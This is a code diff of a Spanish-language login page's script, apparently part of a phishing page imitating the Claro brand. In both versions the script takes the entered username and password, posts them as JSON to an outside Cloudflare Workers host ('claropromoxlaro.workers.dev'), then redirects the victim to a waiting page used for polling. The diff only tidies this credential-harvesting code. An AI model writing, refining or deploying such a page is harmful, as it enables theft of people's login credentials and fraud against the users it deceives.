@@ -17,34 +17,27 @@
   </form>
 
   <script>
-    const loginForm = document.getElementById("loginForm");
-
-    loginForm.addEventListener("submit", async (e) => {
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-      
+
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      try {
-        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ usuario, clave })
-        });
+      // Llamada al Worker
+      const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario, clave })
+      });
 
-        const data = await res.json();
+      const data = await res.json();
 
-        if (data.ok) {
-          // Guardamos el ID temporal para polling
-          localStorage.setItem("login_id", data.id);
-          // Redirigimos a la página de espera
-          window.location.href = "esperando.html";
-        } else {
-          alert("❌ Error al enviar: " + data.error);
-        }
-      } catch(err) {
-        console.error(err);
-        alert("❌ Error de conexión al servidor");
+      if(data.ok) {
+        // Redirige a la página de espera con el id temporal
+        localStorage.setItem("LOGIN_ID", data.id);
+        window.location.href = "esperando.html";
+      } else {
+        alert("❌ Error: " + data.error);
       }
     });
   </script>
